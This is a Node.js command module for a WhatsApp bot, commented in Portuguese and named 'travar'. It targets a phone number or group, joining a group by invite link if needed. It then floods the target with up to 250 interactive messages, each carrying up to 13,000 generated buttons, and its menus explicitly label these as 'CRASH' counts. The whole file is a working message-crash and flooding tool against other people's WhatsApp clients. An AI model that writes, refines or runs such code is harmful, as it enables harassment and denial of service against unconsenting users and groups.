"use strict";

const fs = require("fs");
const path = require("path");

/* =====================================================
   CONFIGURAÇÃO PRINCIPAL
===================================================== */

const CONFIG = {
  nome: "�「 AMHEEX-BOT 」�",

  footer: "�「 AMHEEX-BOT 」� | Sistema automatizado",

  // Caminho da imagem
  imagem: path.join("assets", "img", "icon.png"),

  // Pasta principal dos textos
  pastaTextos: path.join("src", "TextEdition"),

  // Pastas alternativas
  pastasAlternativas: [
    path.join("ListLoad"),
    path.join("assets", "ListLoad"),
  ],

  // Limites de segurança ajustados para suportar as novas opções
  limiteMensagens: 250,
  limiteBotoes: 13000,

  // Intervalo entre envios (10ms)
  intervaloEnvio: 10,

  // Tempo de expiração da sessão
  tempoSessao: 5 * 60 * 1000,

  // Mostrar imagem nos frames
  enviarImagemFrames: true,

  // Mostrar imagem no resumo final
  enviarImagemResumo: true,

  // Exigir confirmação antes do envio
  exigirConfirmacao: true,

  // Botão de suporte
  suporte: {
    ativo: true,
    texto: "📞 Suporte",
    url: "https://wa.me/5546999020341?text=AMHEEX%20Ol%C3%A1",
  },

  // Novas opções de mensagens: 1, 50, 100
  opcoesMensagens: [1, 50, 100],

  // Novas opções de botões: 1000, 5000, 13000
  opcoesBotoes: [1000, 5000, 10000],

  // Definição exata dos botões de ação para validação
  botoesConfirmacao: {
    Confirmar: {
      id: "travar_Confirmar",
      text: "Confirmar",
    },
    cancelar: {
      id: "travar_cancelar",
      text: "Cancelar",
    },
  },
};

/* =====================================================
   DIRETÓRIO BASE
===================================================== */

const BASE_DIR = process.cwd();

/* =====================================================
   IMPORTAÇÃO DOS BOTÕES
===================================================== */

let sendButtons = null;
let sendInteractiveMessage = null;

try {
  const buttonsPath = path.join(
    process.cwd(),
    "src",
    "buttons"
  );

  const buttonsModule = require(buttonsPath);

  if (typeof buttonsModule?.sendButtons === "function") {
    sendButtons = buttonsModule.sendButtons;
  }

  if (
    typeof buttonsModule?.sendInteractiveMessage ===
    "function"
  ) {
    sendInteractiveMessage =
      buttonsModule.sendInteractiveMessage;
  }

  console.log("[TRAVAR] Sistema de botões carregado.");
} catch (error) {
  console.log(
    "[TRAVAR] Sistema de botões indisponível:",
    error?.message || error
  );
}

/* =====================================================
   SESSÕES
===================================================== */

const aguardando = Object.create(null);

const esperar = (ms) =>
  new Promise((resolve) => setTimeout(resolve, ms));

/* =====================================================
   HELPERS GERAIS
===================================================== */

function obterSocket(ctx) {
  return (
    ctx?.socket ||
    ctx?.sock ||
    ctx?.client ||
    ctx?.conn ||
    ctx
  );
}

function obterMensagem(ctx, p2) {
  return (
    ctx?.webMessage ||
    ctx?.message ||
    ctx?.msg ||
    ctx?.m ||
    p2 ||
    null
  );
}

function obterJid(ctx, mensagem) {
  return (
    ctx?.remoteJid ||
    ctx?.jid ||
    ctx?.from ||
    ctx?.chat ||
    mensagem?.key?.remoteJid ||
    null
  );
}

function normalizarJid(jid) {
  if (!jid) return null;

  const valor = String(jid).trim();

  if (valor.endsWith("@g.us")) {
    return valor;
  }

  if (valor.endsWith("@s.whatsapp.net") || valor.endsWith("@c.us")) {
    return valor.replace("@c.us", "@s.whatsapp.net");
  }

  return null;
}

function extrairNumero(texto = "") {
  const numero = String(texto).replace(/\D/g, "");

  if (numero.length < 10) {
    return null;
  }

  return `${numero}@s.whatsapp.net`;
}

function extrairInviteCode(texto = "") {
  const match = String(texto).match(
    /chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i
  );

  return match ? match[1] : null;
}

function extrairNumeroTexto(texto, padrao = 0) {
  const match = String(texto || "").match(/\d+/);

  if (!match) {
    return padrao;
  }

  return Number(match[0]);
}

function limitarNumero(valor, minimo, maximo) {
  const numero = Number(valor);

  if (!Number.isFinite(numero)) {
    return minimo;
  }

  return Math.min(
    maximo,
    Math.max(minimo, Math.floor(numero))
  );
}

function obterRemetente(ctx, mensagem, jid) {
  const rawSender =
    mensagem?.key?.participant ||
    ctx?.sender ||
    mensagem?.participant ||
    mensagem?.key?.remoteJid ||
    jid ||
    "desconhecido";

  return normalizarJid(rawSender) || rawSender;
}

/* =====================================================
   PASTA DOS TEXTOS
===================================================== */

function localizarPastaTextos() {
  const pastas = [
    path.join(BASE_DIR, CONFIG.pastaTextos),
    path.join(process.cwd(), CONFIG.pastaTextos),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(BASE_DIR, pasta)
    ),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(process.cwd(), pasta)
    ),
  ];

  for (const pasta of pastas) {
    if (fs.existsSync(pasta)) {
      return pasta;
    }
  }

  return null;
}

function carregarFrames() {
  const pasta = localizarPastaTextos();

  if (!pasta) {
    throw new Error(
      "Nenhuma pasta de textos foi encontrada."
    );
  }

  const arquivos = fs
    .readdirSync(pasta)
    .filter((arquivo) =>
      arquivo.toLowerCase().endsWith(".txt")
    )
    .sort((a, b) => {
      const numeroA = Number(a.split(".")[0]) || 0;
      const numeroB = Number(b.split(".")[0]) || 0;

      return numeroA - numeroB;
    });

  if (!arquivos.length) {
    throw new Error(
      "Nenhum arquivo .txt foi encontrado."
    );
  }

  const frames = [];

  for (const arquivo of arquivos) {
    const caminho = path.join(pasta, arquivo);

    try {
      const conteudo = fs
        .readFileSync(caminho, "utf8")
        .trim();

      if (conteudo) {
        frames.push(conteudo);
      }
    } catch (error) {
      console.log(
        "[TRAVAR] Erro ao ler arquivo:",
        arquivo,
        error?.message || error
      );
    }
  }

  return frames;
}

/* =====================================================
   IMAGEM
===================================================== */

function obterCaminhoImagem() {
  const caminhos = [
    path.join(BASE_DIR, CONFIG.imagem),
    path.join(process.cwd(), CONFIG.imagem),
  ];

  for (const caminho of caminhos) {
    if (fs.existsSync(caminho)) {
      return caminho;
    }
  }

  return null;
}

function obterImagem() {
  const caminho = obterCaminhoImagem();

  if (!caminho) {
    return null;
  }

  try {
    return fs.readFileSync(caminho);
  } catch (error) {
    console.log(
      "[TRAVAR] Erro ao carregar imagem:",
      error?.message || error
    );

    return null;
  }
}

/* =====================================================
   BOTÕES
===================================================== */

function gerarBotoes(qtd, indexMensagem) {
  const quantidade = limitarNumero(
    qtd,
    1,
    CONFIG.limiteBotoes
  );

  const botoes = [];

  for (let i = 1; i <= quantidade; i++) {
    botoes.push({
      id: `travar_${indexMensagem}_${i}`,
      text: `🤖「 #${i} 」 🤖`,
    });
  }

  return botoes;
}

function gerarBotoesQuantidade(lista) {
  return lista.map((valor) => ({
    id: String(valor),
    text: `Quantidade ${valor}`,
  }));
}

function gerarBotaoUrl(texto, url) {
  return {
    type: "url",
    text: texto,
    url,
  };
}

/* =====================================================
   ENVIO NATIVO COM BOTÕES
===================================================== */

async function enviarMsgComBotoesNative(
  socket,
  jid,
  {
    texto,
    footer = "",
    botoes = [],
    imagem = null,
    quoted = null,
  }
) {
  const botoesFormatados = botoes.map((botao) => {
    if (botao.type === "url" || botao.url) {
      return {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: botao.text,
          url: botao.url,
          merchant_url: botao.url,
        }),
      };
    }

    if (botao.type === "copy") {
      return {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: botao.text,
          id: botao.id || "copiar",
          copy_code: botao.copy_code || "",
        }),
      };
    }

    return {
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({
        display_text: botao.text,
        id: botao.id || botao.text,
      }),
    };
  });

  const header = imagem
    ? {
        title: CONFIG.nome,
        hasMediaAttachment: true,
        imageMessage: {
          jpegThumbnail: imagem,
        },
      }
    : {
        hasMediaAttachment: false,
      };

  const mensagem = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: String(texto),
          },
          footer: {
            text: String(footer),
          },
          header,
          nativeFlowMessage: {
            buttons: botoesFormatados,
          },
        },
      },
    },
  };

  return socket.sendMessage(jid, mensagem, {
    quoted: quoted || undefined,
  });
}

/* =====================================================
   ENVIO COM IMAGEM E BOTÕES
===================================================== */

async function enviarComImagemEBotoes(
  socket,
  jid,
  {
    texto,
    footer,
    botoes,
    quoted,
    usarImagem = true,
  }
) {
  const imagem = usarImagem ? obterImagem() : null;

  if (typeof sendInteractiveMessage === "function") {
    try {
      return await sendInteractiveMessage(socket, jid, {
        image: imagem,
        text: String(texto),
        footer: footer || CONFIG.footer,
        quoted,
        interactiveButtons: botoes.map((botao) => {
          if (botao.type === "url" || botao.url) {
            return {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: botao.text,
                url: botao.url,
                merchant_url: botao.url,
              }),
            };
          }

          return {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: botao.text,
              id: botao.id || botao.text,
            }),
          };
        }),
      });
    } catch (error) {
      console.log(
        "[TRAVAR] Interactive falhou:",
        error?.message || error
      );
    }
  }

  if (typeof sendButtons === "function") {
    try {
      return await sendButtons(socket, jid, {
        text: String(texto),
        footer: footer || CONFIG.footer,
        buttons: botoes,
        quoted,
      });
    } catch (error) {
      console.log(
        "[TRAVAR] sendButtons falhou:",
        error?.message || error
      );
    }
  }

  return enviarMsgComBotoesNative(socket, jid, {
    texto,
    footer: footer || CONFIG.footer,
    botoes,
    imagem,
    quoted,
  });
}

/* =====================================================
   ENVIO DE TEXTO
===================================================== */

async function enviarTexto(
  socket,
  jid,
  texto,
  quoted = null
) {
  return socket.sendMessage(
    jid,
    {
      text: String(texto),
    },
    {
      quoted: quoted || undefined,
    }
  );
}

/* =====================================================
   EXTRAÇÃO DE RESPOSTA DOS BOTÕES (APRIMORADA)
===================================================== */

function extrairRespostaBotao(mensagem) {
  const msg = mensagem?.message;

  if (!msg) {
    return "";
  }

  const interactiveMsg =
    msg.interactiveResponseMessage ||
    msg.viewOnceMessage?.message?.interactiveResponseMessage ||
    msg.viewOnceMessageV2?.message?.interactiveResponseMessage;

  if (interactiveMsg) {
    const paramsJson =
      interactiveMsg.nativeFlowResponseMessage?.paramsJson;

    if (paramsJson) {
      try {
        const parsed = JSON.parse(paramsJson);
        return (
          parsed.id ||
          parsed.selectedId ||
          parsed.reference_id ||
          parsed.display_text ||
          ""
        );
      } catch (_) {
        return String(paramsJson);
      }
    }

    return (
      interactiveMsg.body?.text ||
      interactiveMsg.title ||
      ""
    );
  }

  if (msg.templateButtonReplyMessage) {
    return (
      msg.templateButtonReplyMessage.selectedId ||
      msg.templateButtonReplyMessage.selectedDisplayText ||
      ""
    );
  }

  const resposta =
    msg.buttonsResponseMessage?.selectedButtonId ||
    msg.listResponseMessage?.singleSelectReply
      ?.selectedRowId ||
    "";

  if (!resposta) {
    return "";
  }

  if (typeof resposta === "object") {
    return (
      resposta.id ||
      resposta.selectedId ||
      resposta.display_text ||
      resposta.text ||
      ""
    );
  }

  try {
    const json = JSON.parse(resposta);

    return (
      json.id ||
      json.selectedId ||
      json.params?.id ||
      json.params?.selectedId ||
      json.display_text ||
      resposta
    );
  } catch (_) {
    return String(resposta);
  }
}

/* =====================================================
   EXTRAÇÃO DE TEXTO
===================================================== */

function extrairTexto(ctx, mensagem, args) {
  const botao = extrairRespostaBotao(mensagem);

  if (botao) {
    return botao.trim();
  }

  const textoEntrada = String(
    ctx?.text ||
      ctx?.body ||
      mensagem?.message?.conversation ||
      mensagem?.message?.extendedTextMessage?.text ||
      ""
  ).trim();

  if (textoEntrada) {
    return textoEntrada;
  }

  if (Array.isArray(args) && args.length) {
    return args.join(" ").trim();
  }

  return "";
}

/* =====================================================
   ENVIO DAS OPÇÕES DE MENSAGENS
===================================================== */

async function enviarOpcoesMensagens(
  socket,
  jid,
  quoted,
  alvoJid
) {
  const texto =
    `📌 *Alvo definido*\n\n` +
    `🎯 ${alvoJid}\n\n` +
    `📬 Escolha a quantidade de mensagens:\n` +
    `🔒 Limite máximo: ${CONFIG.limiteMensagens}`;

  const botoes = gerarBotoesQuantidade(
    CONFIG.opcoesMensagens.filter(
      (valor) => valor <= CONFIG.limiteMensagens
    )
  );

  return enviarComImagemEBotoes(socket, jid, {
    texto,
    footer: "Escolha a quantidade de mensagens",
    botoes,
    quoted,
    usarImagem: true,
  });
}

/* =====================================================
   ENVIO DAS OPÇÕES DE BOTÕES
===================================================== */

async function enviarOpcoesBotoes(
  socket,
  jid,
  quoted,
  sessao
) {
  const texto =
    `📌 *Configuração do envio*\n\n` +
    `🎯 Alvo: ${sessao.alvoJid}\n` +
    `📬 Mensagens: ${sessao.qtdMensagens}\n\n` +
    `🔘 Escolha a quantidade de CRASH por mensagem:\n` +
    `🔒 Limite máximo: ${CONFIG.limiteBotoes}`;

  const botoes = gerarBotoesQuantidade(
    CONFIG.opcoesBotoes.filter(
      (valor) => valor <= CONFIG.limiteBotoes
    )
  );

  return enviarComImagemEBotoes(socket, jid, {
    texto,
    footer: "Escolha a quantidade de CRASH",
    botoes,
    quoted,
    usarImagem: true,
  });
}

/* =====================================================
   CONFIRMAÇÃO
===================================================== */

async function enviarConfirmacao(
  socket,
  jid,
  quoted,
  sessao
) {
  const texto =
    `⚠️ *Confirme o envio*\n\n` +
    `🎯 Alvo: ${sessao.alvoJid}\n` +
    `📬 Mensagens: ${sessao.qtdMensagens}\n` +
    `🔘 Crash: ${sessao.qtdBotoes}\n\n` +
    `Deseja iniciar o envio?`;

  const botoes = [
    {
      id: CONFIG.botoesConfirmacao.Confirmar.id,
      text: CONFIG.botoesConfirmacao.Confirmar.text,
    },
    {
      id: CONFIG.botoesConfirmacao.cancelar.id,
      text: CONFIG.botoesConfirmacao.cancelar.text,
    },
  ];

  return enviarComImagemEBotoes(socket, jid, {
    texto,
    footer: CONFIG.footer,
    botoes,
    quoted,
    usarImagem: true,
  });
}

/* =====================================================
   ENVIO DO RESUMO
===================================================== */

async function enviarResumo(
  socket,
  jid,
  quoted,
  sessao,
  enviados
) {
  const texto =
    `🔒 *Envio concluído!*\n\n` +
    `📬 Mensagens enviadas: *${enviados}*\n` +
    `🔘 Crash por mensagem: *${sessao.qtdBotoes}*\n` +
    `🎯 Alvo:\n${sessao.alvoJid}\n\n` +
    `🤖 ${CONFIG.nome}`;

  const botoes = [];

  if (CONFIG.suporte.ativo) {
    botoes.push(
      gerarBotaoUrl(
        CONFIG.suporte.texto,
        CONFIG.suporte.url
      )
    );
  }

  return enviarComImagemEBotoes(socket, jid, {
    texto,
    footer: CONFIG.footer,
    botoes,
    quoted,
    usarImagem: CONFIG.enviarImagemResumo,
  });
}

/* =====================================================
   LIMPEZA DE SESSÕES
===================================================== */

function criarSessao(chave, dados) {
  aguardando[chave] = {
    ...dados,
    criadaEm: Date.now(),
  };
}

function obterSessao(chave) {
  const sessao = aguardando[chave];

  if (!sessao) {
    return null;
  }

  if (
    Date.now() - sessao.criadaEm >
    CONFIG.tempoSessao
  ) {
    delete aguardando[chave];
    return null;
  }

  return sessao;
}

function apagarSessao(chave) {
  delete aguardando[chave];
}

/* =====================================================
   MÓDULO PRINCIPAL
===================================================== */

module.exports = {
  name: "travar",

  prefixes: ["travar", "Cancelar", "cancelar", "Confirmar", "confirmar", "Quantidade"],

  commands: [
    "travar",
    "Cancelar",
    "cancelar",
    "Confirmar",
    "confirmar",
    "Quantidade",
  ],

  aliases: [
    "trava",
    "「",
  ],

  description:
    "🔒 Envio configurável com imagem e botões",

  usage:
    "travar <número | link | grupo> ou 「 <número | link | grupo>",

  handle: async (ctx = {}, p2, p3) => {
    const socket = obterSocket(ctx);
    const webMessage = obterMensagem(ctx, p2);
    const remoteJid = obterJid(ctx, webMessage);

    let args =
      ctx?.args ||
      p3 ||
      [];

    const textoCompleto = extrairTexto(
      ctx,
      webMessage,
      Array.isArray(args) ? args : [args]
    );

    // Se o comando for acionado via prefixo "「", remove o caractere do início dos argumentos para processar o alvo corretamente
    if (typeof textoCompleto === "string" && textoCompleto.startsWith("「")) {
      const limpo = textoCompleto.replace(/^「\s*/, "").trim();
      args = limpo ? limpo.split(/\s+/) : [];
    }

    const texto = extrairTexto(
      ctx,
      webMessage,
      Array.isArray(args) ? args : [args]
    );

    const remetente = obterRemetente(
      ctx,
      webMessage,
      remoteJid
    );

    const enviarResposta = async (mensagem) => {
      if (!socket || !remoteJid) {
        return;
      }

      return enviarTexto(
        socket,
        remoteJid,
        `🤖 ${mensagem}`,
        webMessage
      );
    };

    try {
      if (!socket) {
        console.log(
          "[TRAVAR] Socket não encontrado."
        );

        return;
      }

      if (!remoteJid) {
        console.log(
          "[TRAVAR] JID não encontrado."
        );

        return;
      }

      const sessao = obterSessao(remetente);

      /* =============================================
         CANCELAMENTO (Global / Comando Direto / Botão)
      ============================================= */

      const textoMin = texto.toLowerCase();
      const btnCanc = CONFIG.botoesConfirmacao.cancelar;

      const idCanc = btnCanc.id.toLowerCase();
      const textCanc = btnCanc.text.toLowerCase();

      const ehCancelar =
        textoMin === idCanc ||
        textoMin === textCanc ||
        textoMin.includes(idCanc) ||
        textoMin.includes(textCanc) ||
        /^(cancelar|cancel|travar_cancelar|trava cancelar|❌)$/i.test(textoMin);

      if (ehCancelar) {
        apagarSessao(remetente);

        return enviarResposta(
          "Operação cancelada."
        );
      }

      /* =============================================
         CONFIRMAÇÃO
      ============================================= */

      if (
        sessao?.etapa === "confirmacao"
      ) {
        const btnConf = CONFIG.botoesConfirmacao.Confirmar;

        const idConf = btnConf.id.toLowerCase();
        const textConf = btnConf.text.toLowerCase();

        const ehConfirmar =
          textoMin === idConf ||
          textoMin === textConf ||
          textoMin.includes(idConf) ||
          textoMin.includes(textConf) ||
          /^(Confirmar|✅Confirma|sim|travar_Confirmar|trava Confirmar|trava confirma|✅)$/i.test(textoMin);

        if (ehConfirmar) {
          const dados = {
            ...sessao,
          };

          apagarSessao(remetente);

          let enviados = 0;

          for (
            let i = 0;
            i < dados.qtdMensagens;
            i++
          ) {
            const botoes = gerarBotoes(
              dados.qtdBotoes,
              i + 1
            );

            const frame =
              dados.frames[
                i % dados.frames.length
              ];

            try {
              await enviarComImagemEBotoes(
                socket,
                dados.alvoJid,
                {
                  texto: `🤖 ${frame}`,
                  footer: CONFIG.footer,
                  botoes,
                  quoted: null,
                  usarImagem:
                    CONFIG.enviarImagemFrames,
                }
              );

              enviados++;

              console.log(
                `[TRAVAR] Enviado ${enviados}/${dados.qtdMensagens}`
              );
            } catch (error) {
              console.log(
                "[TRAVAR] Erro no envio:",
                error?.message || error
              );
            }

            if (
              i + 1 < dados.qtdMensagens
            ) {
              await esperar(
                CONFIG.intervaloEnvio
              );
            }
          }

          return enviarResumo(
            socket,
            remoteJid,
            webMessage,
            dados,
            enviados
          );
        }

        return enviarResposta(
          "Responda com Confirmar ou Cancelar."
        );
      }

      /* =============================================
         QUANTIDADE DE BOTÕES
      ============================================= */

      if (
        sessao?.etapa === "botoes"
      ) {
        const quantidade = limitarNumero(
          extrairNumeroTexto(texto, 0),
          1,
          CONFIG.limiteBotoes
        );

        if (
          !quantidade ||
          quantidade < 1
        ) {
          return enviarResposta(
            `Informe uma quantidade entre 1 e ${CONFIG.limiteBotoes}.`
          );
        }

        sessao.qtdBotoes = quantidade;

        if (CONFIG.exigirConfirmacao) {
          sessao.etapa = "confirmacao";

          return enviarConfirmacao(
            socket,
            remoteJid,
            webMessage,
            sessao
          );
        }

        const dados = {
          ...sessao,
        };

        apagarSessao(remetente);

        return enviarResposta(
          `Configuração concluída para ${dados.qtdMensagens} mensagens.`
        );
      }

      /* =============================================
         QUANTIDADE DE MENSAGENS
      ============================================= */

      if (
        sessao?.etapa === "quantidade"
      ) {
        const quantidade = limitarNumero(
          extrairNumeroTexto(texto, 0),
          1,
          CONFIG.limiteMensagens
        );

        if (
          !quantidade ||
          quantidade < 1 ||
          quantidade > CONFIG.limiteMensagens
        ) {
          return enviarResposta(
            `Informe uma quantidade entre 1 e ${CONFIG.limiteMensagens}.`
          );
        }

        sessao.qtdMensagens = quantidade;
        sessao.etapa = "botoes";
        sessao.criadaEm = Date.now();

        return enviarOpcoesBotoes(
          socket,
          remoteJid,
          webMessage,
          sessao
        );
      }

      /* =============================================
         DEFINIÇÃO DO ALVO
      ============================================= */

      const argumentos = Array.isArray(args)
        ? args
        : String(args || "")
            .split(/\s+/)
            .filter(Boolean);

      let alvoJid = null;

      if (
        String(remoteJid).endsWith("@g.us") &&
        !argumentos.length
      ) {
        alvoJid = remoteJid;
      }

      if (
        !alvoJid &&
        argumentos.length
      ) {
        const textoArgumentos =
          argumentos.join(" ");

        const inviteCode =
          extrairInviteCode(textoArgumentos);

        if (inviteCode) {
          try {
            const grupo =
              await socket.groupAcceptInvite(
                inviteCode
              );

            alvoJid = normalizarJid(grupo);
          } catch (error) {
            return enviarResposta(
              "Não foi possível entrar no grupo pelo link."
            );
          }
        }
      }

      if (
        !alvoJid &&
        argumentos.length
      ) {
        alvoJid = extrairNumero(
          argumentos[0]
        );
      }

      if (!alvoJid) {
        return enviarResposta(
          "Uso correto:\n\n" +
            "travar <número>\n" +
            "travar <link do grupo>\n" +
            "travar dentro do grupo"
        );
      }

      /* =============================================
         CARREGAMENTO DOS FRAMES
      ============================================= */

      let frames;

      try {
        frames = carregarFrames();
      } catch (error) {
        return enviarResposta(
          `Erro ao carregar textos: ${error.message}`
        );
      }

      if (!frames.length) {
        return enviarResposta(
          "Nenhum texto disponível para envio."
        );
      }

      /* =============================================
         CRIAR SESSÃO
      ============================================= */

      criarSessao(remetente, {
        etapa: "quantidade",
        alvoJid,
        frames,
      });

      return enviarOpcoesMensagens(
        socket,
        remoteJid,
        webMessage,
        alvoJid
      );
    } catch (error) {
      console.error(
        "[TRAVAR] Erro geral:",
        error?.stack ||
          error?.message ||
          error
      );

      apagarSessao(remetente);

      return enviarResposta(
        "Erro interno ao executar o comando."
      );
    }
  },
};
